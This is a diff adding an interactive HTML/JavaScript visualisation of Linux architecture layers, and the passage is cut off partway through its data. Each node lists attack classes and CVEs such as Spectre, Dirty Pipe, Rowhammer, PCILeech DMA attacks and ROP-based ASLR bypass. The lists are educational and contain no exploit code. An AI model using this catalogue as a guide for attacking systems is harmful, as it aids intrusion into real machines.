@@ -1,0 +1,2237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Linux System Architecture</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Inter:wght@400;500;600;700&display=swap');
+
+:root {
+  --bg: #070e17;
+  --panel-bg: #060d16;
+  --border: #1a2535;
+  --c-hw:   #00ff8c;
+  --c-kern: #00cfff;
+  --c-drv:  #ff6b35;
+  --c-lib:  #f7c59f;
+  --c-usr:  #c77dff;
+  --c-sec:  #ff4d6d;
+  --c-gui:  #ffd60a;
+}
+
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+html, body { width:100%; height:100%; overflow:hidden; background:var(--bg); color:#e2e8f0; font-family:'Inter', sans-serif; }
+
+/* ── HEADER ── */
+header {
+  position:fixed; top:0; left:0; right:0; height:46px; z-index:400;
+  background:rgba(7,14,23,.97); border-bottom:1px solid var(--border);
+  display:flex; align-items:center; padding:0 18px; gap:20px;
+  backdrop-filter:blur(8px);
+}
+header h1 {
+  font-family:'Share Tech Mono'; font-size:.9rem; letter-spacing:3px;
+  color:var(--c-hw); white-space:nowrap;
+}
+.legend { display:flex; gap:12px; flex-wrap:wrap; }
+.li { display:flex; align-items:center; gap:5px; font-size:.63rem; letter-spacing:.5px; color:#64748b; }
+.ld { width:8px; height:8px; border-radius:2px; }
+
+/* ── BREADCRUMB ── */
+#bc {
+  position:fixed; top:46px; left:0; right:0; height:32px; z-index:300;
+  background:rgba(7,14,23,.95); border-bottom:1px solid var(--border);
+  display:flex; align-items:center; padding:0 16px; gap:0;
+  font-family:'Share Tech Mono'; font-size:.62rem;
+  overflow:hidden;
+}
+.bc-item { display:flex; align-items:center; gap:0; }
+.bc-node { padding:2px 7px; cursor:pointer; border-radius:3px; transition:.12s; white-space:nowrap; }
+.bc-node:hover { background:rgba(255,255,255,.07); }
+.bc-sep { color:#1e3a5f; padding:0 2px; }
+.bc-empty { color:#1e3a5f; letter-spacing:2px; }
+
+/* ── LAYOUT ── */
+#layout {
+  position:fixed; top:78px; left:0; right:0; bottom:0;
+  display:flex;
+}
+
+/* ── MAP AREA ── */
+#map-wrap {
+  position:relative; flex:1; overflow:hidden; cursor:default;
+}
+#svg {
+  position:absolute; inset:0; width:100%; height:100%;
+  /* SVG text is always vector-sharp */
+}
+
+/* ── LAYER LABELS — fixed left strip ── */
+#llabels {
+  position:absolute; left:0; top:0; bottom:0; width:110px;
+  pointer-events:none; z-index:10;
+}
+.ll {
+  position:absolute; left:0;
+  display:flex; align-items:center; gap:7px;
+  padding:5px 8px 5px 10px;
+  background:rgba(7,14,23,.82);
+  border-right:2px solid;
+  font-family:'Share Tech Mono'; font-size:.65rem; letter-spacing:2px;
+  white-space:nowrap; transform:translateY(-50%);
+  backdrop-filter:blur(4px);
+  transition: top .05s;
+}
+.ll .ll-dot { width:6px; height:6px; border-radius:50%; flex-shrink:0; }
+
+/* ── CONTROLS ── */
+#ctrl {
+  position:fixed; bottom:16px; left:130px;
+  display:flex; gap:6px; z-index:400;
+}
+.btn {
+  background:rgba(255,255,255,.04); border:1px solid var(--border);
+  color:#64748b; font-family:'Share Tech Mono'; font-size:.62rem;
+  padding:5px 12px; cursor:pointer; letter-spacing:1.5px; border-radius:3px;
+  transition:.15s;
+}
+.btn:hover { background:rgba(255,255,255,.08); color:#94a3b8; border-color:#2a3f5f; }
+.btn.active { border-color:var(--c-hw); color:var(--c-hw); background:rgba(0,255,140,.06); }
+
+/* zoom btns */
+#zoom-ctrl {
+  position:fixed; bottom:16px; left:16px; z-index:400;
+  display:flex; flex-direction:column; gap:4px;
+}
+#zoom-ctrl button {
+  width:30px; height:30px; background:rgba(255,255,255,.04);
+  border:1px solid var(--border); color:#64748b; border-radius:3px;
+  cursor:pointer; font-size:14px; transition:.15s; display:flex; align-items:center; justify-content:center;
+}
+#zoom-ctrl button:hover { background:rgba(255,255,255,.08); color:#94a3b8; }
+
+/* hint */
+#hint {
+  position:fixed; bottom:20px; right:380px;
+  font-family:'Share Tech Mono'; font-size:.58rem; color:#1a2d47;
+  letter-spacing:1.5px; pointer-events:none;
+}
+#hint.panel-closed { right:24px; }
+
+/* ── SIDE PANEL ── */
+#panel {
+  width:340px; flex-shrink:0;
+  background:var(--panel-bg); border-left:1px solid var(--border);
+  overflow:hidden;
+  display:flex; flex-direction:column; position:relative;
+  transform:translateX(100%);
+  transition:transform .28s cubic-bezier(.4,0,.2,1);
+}
+#panel.open { transform:translateX(0); }
+
+#panel-inner {
+  width:100%; height:100%; display:flex; flex-direction:column;
+  overflow:hidden;
+}
+#ph {
+  padding:16px 16px 12px; border-bottom:1px solid var(--border);
+  flex-shrink:0;
+}
+#p-title { font-size:1.1rem; font-weight:700; letter-spacing:1px; margin-bottom:3px; font-family:'Share Tech Mono'; }
+#p-ltag { font-size:.58rem; letter-spacing:3px; font-family:'Share Tech Mono'; opacity:.5; }
+#p-desc { font-size:.78rem; line-height:1.6; color:#94a3b8; margin-top:8px; }
+
+#pbody {
+  flex:1; overflow-y:auto; padding:0 14px 20px;
+}
+#pbody::-webkit-scrollbar { width:3px; }
+#pbody::-webkit-scrollbar-thumb { background:#1a2535; border-radius:2px; }
+
+#close-btn {
+  position:absolute; top:12px; right:12px; background:none; border:none;
+  color:#334155; font-size:.9rem; cursor:pointer; padding:4px; z-index:1;
+}
+#close-btn:hover { color:#94a3b8; }
+
+/* panel sections */
+.sh {
+  font-size:.6rem; letter-spacing:2.5px; text-transform:uppercase;
+  color:#334155; margin:14px 0 7px;
+  border-bottom:1px solid var(--border); padding-bottom:5px;
+  display:flex; align-items:center; gap:6px; font-family:'Share Tech Mono';
+}
+.path-box {
+  background:rgba(255,255,255,.02); border:1px solid var(--border);
+  border-radius:3px; padding:8px 10px; display:flex; flex-direction:column; gap:5px;
+}
+.path-row { display:flex; align-items:flex-start; gap:6px; }
+.pd {
+  font-family:'Share Tech Mono'; font-size:.55rem; letter-spacing:1px;
+  padding:2px 5px; border-radius:2px; white-space:nowrap; flex-shrink:0; margin-top:2px;
+}
+.pd-up   { background:rgba(0,207,255,.1);  color:#00cfff; }
+.pd-down { background:rgba(0,255,140,.1);  color:#00ff8c; }
+.pd-xref { background:rgba(199,125,255,.1);color:#c77dff; }
+.pchips { display:flex; flex-wrap:wrap; gap:4px; }
+.pchip {
+  font-family:'Share Tech Mono'; font-size:.58rem; padding:2px 7px;
+  cursor:pointer; border-radius:2px; border:1px solid; transition:.12s;
+  white-space:nowrap;
+}
+.pchip:hover { filter:brightness(1.3); }
+
+/* components */
+.cl { display:flex; flex-direction:column; gap:2px; }
+.ci {
+  display:flex; align-items:center; justify-content:space-between;
+  font-family:'Share Tech Mono'; font-size:.65rem;
+  padding:5px 8px; background:rgba(255,255,255,.025);
+  border:1px solid rgba(255,255,255,.05); border-left:2px solid;
+  border-radius:0 3px 3px 0; transition:.12s;
+}
+.ci.clk { cursor:pointer; }
+.ci.clk:hover { background:rgba(255,255,255,.06); transform:translateX(2px); }
+.ci-label { color:#cbd5e1; }
+.ci-right { display:flex; align-items:center; gap:5px; flex-shrink:0; margin-left:6px; }
+.clink {
+  font-size:.52rem; letter-spacing:.5px; padding:1px 5px;
+  border-radius:2px; border:1px solid; cursor:pointer;
+}
+.clink:hover { opacity:.7; }
+.carrow { color:#334155; font-size:.65rem; }
+
+.sub-block { margin:1px 0 2px 14px; border-left:1px solid #1a2535; padding-left:8px; }
+.sub-item {
+  font-family:'Share Tech Mono'; font-size:.6rem; color:#475569;
+  padding:3px 5px; border-bottom:1px solid #0d1a27;
+  cursor:pointer; transition:.12s; display:flex; justify-content:space-between; align-items:center;
+}
+.sub-item:hover { color:#94a3b8; background:rgba(255,255,255,.03); }
+
+/* security */
+.seci {
+  font-family:'Share Tech Mono'; font-size:.62rem;
+  color:#f87171; padding:4px 8px;
+  border-bottom:1px solid rgba(255,77,109,.06);
+  display:flex; gap:5px; align-items:flex-start;
+  cursor:pointer; transition:.12s; border-radius:2px;
+}
+.seci:hover { background:rgba(255,77,109,.06); }
+.sec-badge {
+  display:inline-block;
+  background:rgba(255,77,109,.08); border:1px solid rgba(255,77,109,.25);
+  color:#ff4d6d; font-family:'Share Tech Mono'; font-size:.55rem;
+  padding:2px 7px; letter-spacing:2px; border-radius:2px; margin-bottom:7px;
+}
+
+/* related */
+.rg { display:flex; flex-wrap:wrap; gap:4px; margin-top:4px; }
+.rc {
+  font-family:'Share Tech Mono'; font-size:.58rem;
+  padding:3px 8px; cursor:pointer; border-radius:2px; border:1px solid;
+  transition:.15s; letter-spacing:.5px;
+}
+.rc:hover { filter:brightness(1.25); }
+
+/* ── FILESYSTEM TREE ── */
+.fs-tree { display:flex; flex-direction:column; gap:2px; }
+.fs-dir-row {
+  display:flex; align-items:center;
+  background:rgba(255,255,255,.025); border:1px solid rgba(255,255,255,.06);
+  border-left:2px solid #ffd60a; border-radius:0 3px 3px 0;
+  cursor:pointer; transition:.12s; user-select:none;
+}
+.fs-dir-row:hover { background:rgba(255,255,255,.06); }
+.fs-dir-toggle { color:#ffd60a; font-size:.65rem; width:22px; text-align:center; flex-shrink:0; }
+.fs-dir-path { font-family:'Share Tech Mono'; font-size:.62rem; color:#ffd60a; padding:4px 4px 4px 0; flex:1; word-break:break-all; }
+.fs-dir-desc { font-size:.57rem; color:#475569; padding:4px 8px 4px 0; flex-shrink:0; }
+.fs-children { margin-left:14px; border-left:1px solid rgba(255,214,10,.12); display:none; }
+.fs-children.open { display:block; }
+.fs-file-row {
+  display:flex; align-items:flex-start; gap:6px;
+  padding:3px 10px 3px 8px; border-bottom:1px solid rgba(255,255,255,.025);
+}
+.fs-file-row:hover { background:rgba(255,255,255,.03); }
+.fs-file-icon { color:#334155; font-size:.58rem; flex-shrink:0; padding-top:2px; }
+.fs-fname { font-family:'Share Tech Mono'; font-size:.61rem; color:#64748b; white-space:nowrap; flex-shrink:0; }
+.fs-fdesc { font-size:.59rem; color:#475569; line-height:1.45; padding-left:6px; }
+.fs-fpurpose { font-size:.57rem; color:#1e3a5f; font-style:italic; }
+.fs-subdir-row {
+  display:flex; align-items:center;
+  padding:2px 8px; border-bottom:1px solid rgba(255,255,255,.02);
+  cursor:pointer; transition:.1s;
+}
+.fs-subdir-row:hover { background:rgba(255,255,255,.04); }
+.fs-subdir-toggle { color:#94a3b8; font-size:.58rem; width:18px; text-align:center; flex-shrink:0; }
+.fs-subdir-name { font-family:'Share Tech Mono'; font-size:.6rem; color:#94a3b8; }
+.fs-subdir-desc { font-size:.57rem; color:#334155; margin-left:6px; }
+.fs-grandchildren { margin-left:18px; border-left:1px solid rgba(255,255,255,.06); display:none; }
+.fs-grandchildren.open { display:block; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>LINUX ARCHITECTURE</h1>
+  <div class="legend" id="legend"></div>
+</header>
+<div id="bc"><span class="bc-empty">// click a node to begin</span></div>
+
+<div id="layout">
+  <div id="map-wrap">
+    <svg id="svg" xmlns="http://www.w3.org/2000/svg"></svg>
+    <div id="llabels"></div>
+  </div>
+  <div id="panel">
+    <div id="panel-inner">
+      <button id="close-btn" onclick="closePanel()">✕</button>
+      <div id="ph">
+        <div id="p-title">—</div>
+        <div id="p-ltag"></div>
+        <div id="p-desc"></div>
+      </div>
+      <div id="pbody"></div>
+    </div>
+  </div>
+</div>
+
+<div id="zoom-ctrl">
+  <button onclick="zoom(1.2)">＋</button>
+  <button onclick="zoom(0.83)">－</button>
+  <button onclick="resetView()">⌂</button>
+</div>
+<div id="ctrl">
+  <button class="btn active" id="btn-links" onclick="toggleLinks()">LINKS</button>
+  <button class="btn" id="btn-highlight" onclick="toggleHighlight()">HIGHLIGHT PATH</button>
+  <button class="btn" onclick="clearPath()">DESELECT</button>
+</div>
+<div id="hint" class="panel-closed">scroll to zoom · drag to pan · click node</div>
+
+<script>
+// ══════════════════════════════════════════
+//  DATA
+// ══════════════════════════════════════════
+const LAYERS = [
+  {id:'hw',     label:'HARDWARE',        color:'#00ff8c', wy:1180},
+  {id:'kernel', label:'KERNEL',          color:'#00cfff', wy:980},
+  {id:'driver', label:'DRIVERS/SYSCALL', color:'#ff6b35', wy:790},
+  {id:'libs',   label:'LIBRARIES',       color:'#f7c59f', wy:610},
+  {id:'user',   label:'USERLAND',        color:'#c77dff', wy:440},
+  {id:'sec',    label:'SECURITY',        color:'#ff4d6d', wy:275},
+  {id:'gui',    label:'GUI / BOOT',      color:'#ffd60a', wy:110},
+];
+const LAYER_MAP = {};
+LAYERS.forEach(l=>LAYER_MAP[l.id]=l);
+function lc(lid){return LAYER_MAP[lid]?.color||'#aaa';}
+
+// NODE RECT SIZE
+const NW=150, NH=42;
+
+const NODES = [
+// ─ HARDWARE ─
+{id:'cpu',        layer:'hw',     wx:180,  wy:1180, label:'CPU',
+ desc:'Central Processing Unit. Fetch-decode-execute loop. Privilege rings (0=kernel, 3=user). MMU and cache hierarchy. Speculative execution.',
+ components:[
+  {l:'x86-64 ISA',               s:['CISC instruction encoding','REX prefixes (64-bit)','SSE/AVX extensions','syscall/sysret instruction'],lk:null},
+  {l:'Privilege Rings 0–3',      s:['Ring 0 → kernel mode (full HW access)','Ring 3 → userspace (restricted)','Rings 1–2 rarely used on Linux','CPL field in CS segment register'],lk:'kernel_core'},
+  {l:'APIC (Interrupt Controller)',s:['Local APIC per core','IOAPIC for external IRQs','MSI/MSI-X for PCIe devices','NMI (non-maskable interrupt)'],lk:'irq_node'},
+  {l:'Cache Hierarchy L1/L2/L3', s:['L1i/L1d: 32–64 KB per core','L2: 256 KB–1 MB per core','L3: shared, 8–64 MB','Cache line: 64 bytes'],lk:null},
+  {l:'Speculative Execution',    s:['Branch predictor','Out-of-order execution','Store buffer / load buffer','Retirement unit'],lk:null},
+ ],
+ security:['Spectre v1/v2 (branch predictor leak → KPTI)','Meltdown (OOO + cache timing)','MDS/TAA (microarch data sampling)','Microcode bypass','Hyperthreading SMT timing attacks'],
+ related:['mmu','irq_node','kernel_core','firmware'],
+ paths:{up:[],down:['kernel_core','vm_subsys'],xref:['mmu','firmware']}},
+
+{id:'mmu',        layer:'hw',     wx:490,  wy:1180, label:'MMU',
+ desc:'Memory Management Unit. Translates virtual→physical addresses using per-process page tables. Enforces isolation. Hardware-managed TLB caches translations.',
+ components:[
+  {l:'TLB (Translation Lookaside Buffer)',s:['iTLB / dTLB split','TLB shootdown on context switch','PCID (Process Context ID)','INVLPG instruction'],lk:null},
+  {l:'4-level Page Tables',s:['PGD → PUD → PMD → PTE','CR3 register points to PGD','4 KB / 2 MB / 1 GB page sizes','Present / RW / NX / US flags per entry'],lk:'vm_subsys'},
+  {l:'SMEP / SMAP',s:['SMEP: kernel cannot execute user pages','SMAP: kernel cannot access user data','CR4.SMEP, CR4.SMAP bits','Bypass requires controlled kernel write → pivot'],lk:'sec_mech'},
+  {l:'IOMMU (VT-d / AMD-Vi)',s:['Restricts DMA to authorised pages','Second-level address translation','Interrupt remapping','ACS (Access Control Services)'],lk:'dma'},
+ ],
+ security:['Page table injection / manipulation','KASLR bypass via page table side-channel','TLB timing side-channel','Rowhammer → PT bit flip → privilege esc'],
+ related:['cpu','memory','vm_subsys','dma'],
+ paths:{up:[],down:['vm_subsys'],xref:['cpu','dma']}},
+
+{id:'memory',     layer:'hw',     wx:800,  wy:1180, label:'RAM / Storage',
+ desc:'DRAM holds all runtime state. NVMe/SSD/HDD for persistence. Swap extends RAM to disk. DMA enables direct device↔RAM transfers without CPU involvement.',
+ components:[
+  {l:'DRAM (DDR4/DDR5)',s:['Rows/columns/banks structure','Refresh cycles (tREFI)','ECC (error correcting code)','Dual channel / NUMA topology'],lk:null},
+  {l:'Swap Space',s:['Swap partition or swapfile','/proc/sys/vm/swappiness knob','zswap compressed cache','Sensitive data can land in swap unencrypted'],lk:null},
+  {l:'NVMe / SATA / HDD',s:['NVMe: PCIe lanes, queue depth','SATA: 6 Gbps, AHCI controller','Disk encryption (dm-crypt / LUKS)','Sector / block alignment'],lk:'filesystem'},
+  {l:'Memory-mapped I/O (MMIO)',s:['Device registers mapped in VA space','ioremap() in kernel','/dev/mem access (needs CAP_SYS_RAWIO)','Used by GPU, NIC firmware'],lk:'drivers'},
+ ],
+ security:['Cold boot attack (DRAM remanence ~seconds)','Rowhammer (bit-flip via repeated DRAM access)','DMA attack (PCILeech via Thunderbolt)','Swap leaks sensitive data unencrypted','Evil maid: offline disk read'],
+ related:['mmu','dma','filesystem','vm_subsys'],
+ paths:{up:[],down:['vm_subsys','filesystem'],xref:['dma','mmu']}},
+
+{id:'firmware',   layer:'hw',     wx:1110, wy:1180, label:'Firmware / UEFI',
+ desc:'Code that runs before the OS. UEFI initialises hardware, enforces Secure Boot chain, hands off to bootloader. SMM is completely invisible to the OS.',
+ components:[
+  {l:'UEFI Firmware',s:['DXE phase (driver execution env)','BDS (boot device selection)','Runtime services (persist across boot)','NVRAM variables (efivar fs)'],lk:null},
+  {l:'Secure Boot Chain',s:['PK → KEK → db / dbx hierarchy','shim.efi (MOK for distros)','GRUB2 signature verification','Kernel module signing (CONFIG_MODULE_SIG)'],lk:'bootloader_node'},
+  {l:'SMM (System Mgmt Mode)',s:['Ring -2 (below OS and hypervisor)','SMRAM: physically hidden from OS','Triggered by SMI (hardware or software)','SMI handler code lives in SMRAM'],lk:null},
+  {l:'Intel ME / AMD PSP',s:['Separate CPU running Minix / ARM','Always-on (even when host is off)','AMT out-of-band management','ME network stack on same physical NIC'],lk:null},
+  {l:'TPM 2.0',s:['PCR registers (SHA-256 extend chain)','Sealed keys (bound to PCR state)','Attestation (remote platform verify)','tpm2-tools CLI'],lk:'tpm_node'},
+ ],
+ security:['Bootkit (persists across OS reinstall)','SMM rootkit (invisible to kernel / hypervisor)','UEFI variable injection','Intel ME CVEs (INTEL-SA-00086)','Secure Boot bypass (CVE-2020-10713 BootHole, CVE-2022-21894)'],
+ related:['cpu','bootloader_node','tpm_node','kernel_core'],
+ paths:{up:[],down:['bootloader_node','kernel_core'],xref:['tpm_node']}},
+
+{id:'nic_hw',     layer:'hw',     wx:1420, wy:1180, label:'Network / Peripherals',
+ desc:'NIC, GPU, USB, PCIe devices. DMA-capable hardware. IOMMU restricts DMA. BadUSB exploits USB firmware. PCIe DMA attacks bypass all OS security.',
+ components:[
+  {l:'NIC (Ethernet / WiFi)',s:['PHY layer → MAC → kernel driver','NAPI (interrupt coalescing)','SR-IOV (virtualised NIC functions)','Firmware stored in NIC EEPROM'],lk:'drivers'},
+  {l:'PCIe Bus',s:['Root complex → switches → endpoints','BAR (Base Address Registers)','MSI/MSI-X interrupt delivery','AER (advanced error reporting)'],lk:'dma'},
+  {l:'USB Stack',s:['USB host controller (xHCI)','USB hub tree enumeration','Vendor/Product ID matching','USB gadget mode (device role)'],lk:'drivers'},
+  {l:'GPU / DRM',s:['GEM (Graphics Execution Manager)','Command ring buffer','VRAM (GPU-accessible memory)','DRM/KMS kernel subsystem'],lk:'drm_node'},
+ ],
+ security:['BadUSB / Rubber Ducky (firmware swap)','PCIe DMA attack (PCILeech / Inception)','GPU side-channel (cross-VM pixel data)','NIC firmware persistence','IOMMU bypass via misconfigured passthrough'],
+ related:['mmu','dma','drivers','net_stack'],
+ paths:{up:[],down:['drivers','dma'],xref:['mmu']}},
+
+// ─ KERNEL ─
+{id:'kernel_core',layer:'kernel', wx:155,  wy:980,  label:'Kernel Core',
+ desc:'Monolithic kernel running in Ring 0. Manages all hardware, enforces isolation. All subsystems share one address space — one exploit = full compromise.',
+ components:[
+  {l:'Kernel Image (vmlinuz)',s:['Compressed bzImage format','Decompressor (head_64.S)','KASLR: random load base at boot','kallsyms: symbol table (kptr_restrict)'],lk:null},
+  {l:'Module System (.ko files)',s:['modprobe / insmod / rmmod','Module signing (CONFIG_MODULE_SIG)','/proc/modules live list','Dynamic kernel extension (attack surface)'],lk:null},
+  {l:'Kernel Linked List / RCU',s:['list_head doubly-linked structure','RCU (Read-Copy-Update lockless)','Spinlocks / mutexes / seqlocks','Lockdep (deadlock detector)'],lk:null},
+  {l:'kprobes / ftrace',s:['Dynamic instrumentation at runtime','Breakpoint-based function probing','Function tracer (ring buffer)','eBPF attachment point'],lk:'ebpf_node'},
+  {l:'Kernel Hardening (build-time)',s:['KASLR','Stack canaries (CONFIG_STACKPROTECTOR)','KPTI (page-table isolation)','CFI / Shadow Call Stack (ARM/x86 new)'],lk:'sec_mech'},
+ ],
+ security:['LPE via kernel bug (UAF, OOB write, type confusion)','Dirty COW (CVE-2016-5195): race on COW mapping','Dirty Pipe (CVE-2022-0847): splice() pipe overwrite','KPTI bypass via speculative exec gadget','kallsyms leaks kernel addresses when kptr_restrict=0'],
+ related:['cpu','vm_subsys','scheduler','net_stack','filesystem'],
+ paths:{up:['cpu','firmware'],down:['vm_subsys','scheduler','net_stack','syscall_iface','drivers'],xref:['sec_mech','ebpf_node']}},
+
+{id:'scheduler',  layer:'kernel', wx:490,  wy:980,  label:'Scheduler',
+ desc:'Decides which task runs on which CPU core. CFS for normal tasks; RT for real-time. Context switch saves and restores full CPU state.',
+ components:[
+  {l:'CFS (Completely Fair Scheduler)',s:['Red-black tree of runnable tasks','Virtual runtime (vruntime) as key','cfs_rq per-CPU run queue','sched_latency_ns tunable'],lk:null},
+  {l:'RT Scheduler (SCHED_FIFO/RR)',s:['Fixed priority 1–99 (above CFS)','Never preempted by CFS tasks','Used by audio daemons, RT kernel','Requires CAP_SYS_NICE'],lk:null},
+  {l:'Context Switch',s:['switch_to() macro (arch-specific)','Save: registers, FPU state, CR3','Restore: reload TLB (CR3 write)','Cost: ~1–10 μs per switch'],lk:'cpu'},
+  {l:'CPU Cgroups',s:['cpu.shares (relative weight)','cpu.cfs_quota_us (hard cap)','cpuset: pin tasks to cores','cgroup v2 unified hierarchy'],lk:'cgroups_node'},
+  {l:'NUMA Scheduler',s:['Node-local memory preference','NUMA balancing (migration daemon)','numa_faults per-task tracking','numactl CLI'],lk:null},
+ ],
+ security:['CPU scheduler side-channels (timing residue)','Cgroup CPU exhaustion (DoS container escape)','RT priority abuse (starvation attack)','Context switch timing attack (covert channel)'],
+ related:['kernel_core','cgroups_node','process_node'],
+ paths:{up:['cpu'],down:['process_node','cgroups_node'],xref:['kernel_core']}},
+
+{id:'vm_subsys',  layer:'kernel', wx:820,  wy:980,  label:'Virtual Memory',
+ desc:'Manages per-process virtual address spaces. Maps file-backed and anonymous pages. Handles page faults. Implements ASLR, NX, W^X enforcement at page granularity.',
+ components:[
+  {l:'Buddy Allocator',s:['Free page lists by order 2^n','Coalescing (merge buddy pairs)','/proc/buddyinfo state','GFP flags: GFP_KERNEL, GFP_ATOMIC, GFP_DMA'],lk:null},
+  {l:'Slab Allocator (SLUB)',s:['Object caches (kmem_cache)','kmalloc() / kfree()','/proc/slabinfo accounting','Freelist pointer manipulation (exploit primitive)'],lk:null},
+  {l:'mmap / brk / mprotect',s:['mmap: file-backed or anonymous VMA','brk: heap segment expansion','mprotect: change page permissions','VMA (vm_area_struct) linked list in mm_struct'],lk:'syscall_iface'},
+  {l:'OOM Killer',s:['oom_score per process (0–1000)','badness() scoring heuristic','SIGKILL sent to chosen victim','/proc/sys/vm/overcommit_memory policy'],lk:null},
+  {l:'ASLR / KASLR',s:['mmap_rnd_bits=32 (user ASLR entropy)','KASLR: kernel load base randomised','PIE: position-independent executable','Defeat: info leak primitive → fixed offset'],lk:'sec_mech'},
+ ],
+ security:['Heap spray / heap grooming (shape allocator)','Use-after-free (UAF) exploitation','Stack overflow → RIP/PC control','ret2libc / ROP chains','ASLR bypass (info leak + fixed offset)','Dirty COW (write to read-only page via race)'],
+ related:['mmu','memory','kernel_core','sec_mech'],
+ paths:{up:['mmu','memory'],down:['libc_node','glibc_load'],xref:['sec_mech','kernel_core']}},
+
+{id:'net_stack',  layer:'kernel', wx:1160, wy:980,  label:'Network Stack',
+ desc:'Full TCP/IP implementation in-kernel. sk_buff is the universal packet structure. Netfilter hooks intercept at 5 chain points. eBPF/XDP enables programmable fast-path.',
+ components:[
+  {l:'Socket Layer',s:['AF_INET (IPv4/IPv6)','AF_UNIX (local IPC socket)','AF_PACKET (raw Ethernet frames)','AF_NETLINK (kernel config interface)'],lk:'socket_node'},
+  {l:'TCP/IP Stack',s:['sk_buff (socket buffer struct)','TCP state machine (SYN/ACK/FIN/RST)','Congestion control (CUBIC, BBR)','IP routing table (FIB trie)'],lk:null},
+  {l:'Netfilter Hooks',s:['NF_INET_PRE_ROUTING','NF_INET_LOCAL_IN / LOCAL_OUT','NF_INET_FORWARD','nf_conntrack state table'],lk:'netfilter_node'},
+  {l:'eBPF / XDP',s:['XDP: earliest RX hook (driver/NIC level)','TC BPF: traffic control hook','Socket filters (SO_ATTACH_BPF)','bpftool / bpftrace tooling'],lk:'ebpf_node'},
+  {l:'NAPI (Interrupt Coalescing)',s:['Switches RX from IRQ to poll mode','napi_schedule() trigger','Softirq NET_RX_SOFTIRQ handler','Reduces interrupt overhead under load'],lk:'irq_node'},
+ ],
+ security:['CVE-2017-9075 (IPv6 UAF → ring-0)','TCP SYN flood (SYN cookies as mitigation)','Raw socket sniffing requires CAP_NET_RAW','eBPF LPE: CVE-2021-3490, CVE-2022-23222','Kernel net exploit → full ring-0 compromise'],
+ related:['kernel_core','netfilter_node','socket_node','ebpf_node'],
+ paths:{up:['nic_hw'],down:['socket_node','netfilter_node'],xref:['ebpf_node']}},
+
+{id:'proc_fs',    layer:'kernel', wx:1500, wy:980,  label:'procfs / sysfs',
+ desc:'Pseudo-filesystems exposing kernel internals as virtual files. /proc for process/kernel state, /sys for device model, /dev for devices. Primary info-leak surface.',
+ components:[
+  {l:'/proc filesystem',s:['/proc/self/maps (VA layout → ASLR defeat)','/proc/self/mem (process memory R/W)','/proc/kallsyms (kernel symbols)','/proc/net/* (network state)'],lk:'filesystem'},
+  {l:'/sys filesystem',s:['/sys/bus / /sys/class device tree','Device attribute virtual files','/sys/kernel/kptr_restrict (symbol hiding)','/sys/fs/cgroup (cgroup v1)'],lk:null},
+  {l:'/dev filesystem',s:['/dev/mem (physical RAM → needs root)','/dev/kmem (kernel virtual mem)','/dev/ptmx (pseudo-TTY master)','udev rules (/etc/udev/rules.d)'],lk:'drivers'},
+  {l:'debugfs',s:['/sys/kernel/debug/ mount','kprobes interface','KASAN / UBSAN output','eBPF debug map access'],lk:'ebpf_node'},
+ ],
+ security:['/proc/self/mem write → process code injection','/proc/kallsyms defeats KASLR when kptr_restrict=0','/dev/mem → read/write physical RAM (needs cap)','debugfs world-readable misconfig leaks','dmesg info leaks (dmesg_restrict=0)'],
+ related:['kernel_core','filesystem','ebpf_node'],
+ paths:{up:['kernel_core'],down:['filesystem'],xref:['ebpf_node','sec_mech']}},
+
+// ─ DRIVERS / SYSCALL ─
+{id:'drivers',    layer:'driver', wx:155,  wy:790,  label:'Device Drivers',
+ desc:'Kernel modules interfacing with hardware. Character, block, network driver types. Loaded as .ko files. Each bug = ring-0 code execution potential.',
+ components:[
+  {l:'Character Drivers',s:['/dev/tty, /dev/null, /dev/urandom','file_operations struct dispatch','ioctl() dispatch table','IOCTL number collision attack surface'],lk:null},
+  {l:'Block Drivers',s:['/dev/sda, /dev/nvme0n1','request_queue structure','bio / request structs','SCSI layer (libata under IDE/SATA)'],lk:'filesystem'},
+  {l:'Network Drivers',s:['net_device struct','ndo_start_xmit() → TX path','NAPI poll → RX path','Ethtool interface for config'],lk:'net_stack'},
+  {l:'USB Subsystem',s:['usb_driver struct registration','URB (USB Request Block)','USB core and hub driver','USB gadget (device-side mode)'],lk:'nic_hw'},
+  {l:'Kernel Module Loading',s:['modprobe searches /lib/modules/<kver>/','insmod: manual load (no deps)','Module signing check (UEFI SB)','rmmod and /proc/modules tracking'],lk:'kernel_core'},
+ ],
+ security:['Driver UAF/OOB → ring-0 exploit','Unsigned module loading (bypass with no SB)','IOCTL race conditions (TOCTOU)','Malicious USB device → kernel parsing bug','VMware/VirtualBox guest escape via guest driver'],
+ related:['nic_hw','dma','kernel_core','irq_node'],
+ paths:{up:['nic_hw','memory'],down:['dma','irq_node'],xref:['kernel_core','filesystem']}},
+
+{id:'dma',        layer:'driver', wx:480,  wy:790,  label:'DMA / IOMMU',
+ desc:'Direct Memory Access: hardware reads/writes RAM without CPU. IOMMU creates second-level page tables to restrict device DMA to authorised regions only.',
+ components:[
+  {l:'DMA Engine',s:['dma_map_single() / dma_map_sg()','Coherent vs streaming DMA','Bounce buffers (32-bit legacy devices)','DMA-BUF shared buffer framework'],lk:null},
+  {l:'IOMMU Page Tables',s:['Intel VT-d domain tables','AMD-Vi IOMMU tables','IOMMU group (passthrough unit)','/sys/kernel/iommu_groups/ view'],lk:'mmu'},
+  {l:'PCIe ATS / PRI',s:['Address Translation Services','Page Request Interface','SR-IOV virtual functions','IOMMU bypass via ATS misconfiguration'],lk:null},
+ ],
+ security:['PCILeech: DMA via Thunderbolt/PCIe → bypass all OS security','IOMMU misconfigured → device reads kernel memory','DMA buffer overflow (device writes past buffer)','Interrupt remapping bypass','VMware escape via DMA gadget'],
+ related:['memory','nic_hw','drivers','mmu'],
+ paths:{up:['nic_hw','memory'],down:[],xref:['mmu','drivers']}},
+
+{id:'syscall_iface',layer:'driver',wx:800, wy:790,  label:'Syscall Interface',
+ desc:'The Ring-3 → Ring-0 boundary. ~450 Linux syscalls. SYSCALL instruction + dispatch table. Every argument must be validated in kernel space. Largest LPE attack surface.',
+ components:[
+  {l:'Syscall Dispatch',s:['sys_call_table[] array','~450 NR_syscalls','SYSCALL → swapgs → kernel stack','Entry point: entry_SYSCALL_64'],lk:'kernel_core'},
